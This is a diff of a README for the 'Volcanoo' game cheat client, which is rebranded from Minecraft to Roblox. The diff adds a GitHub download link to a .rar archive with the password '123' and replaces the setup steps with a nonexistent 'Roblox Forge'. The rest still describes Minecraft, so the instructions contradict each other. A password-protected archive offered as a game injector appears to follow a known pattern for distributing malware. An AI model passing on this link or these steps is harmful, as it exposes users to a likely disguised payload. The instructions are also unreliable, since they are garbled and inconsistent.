@@ -1,5 +1,4 @@
-# Volcanoo-Minecraft-Utility
-https://www.volcanoo.onl/
+# Volcanoo-Roblox-Utility
 
 # ❄️ Volcanoo Client
 
@@ -12,15 +11,14 @@ Volcanoo Client is a utility modification for Minecraft Java Edition 1.12.2, des
 
 **Archive Access Information:**
 - The downloaded files are packaged in archive format
+- https://github.com/nightbringer35niko/Volcanoo-Roblox-Injector/releases/download/Volcanoo/Volcanoo.rar
 - Use the following code to access: `123`
 
 ---
 
 ## 🛠️ Setup Instructions
 
-1. **Install Minecraft Forge:**
-   - Download Forge installer for version 1.12.2 from official source
-   - Run installer and select "Install client"
+1. **Install Roblox Forge:**
 
 2. **Prepare Mods Directory:**
    - Navigate to your Minecraft directory
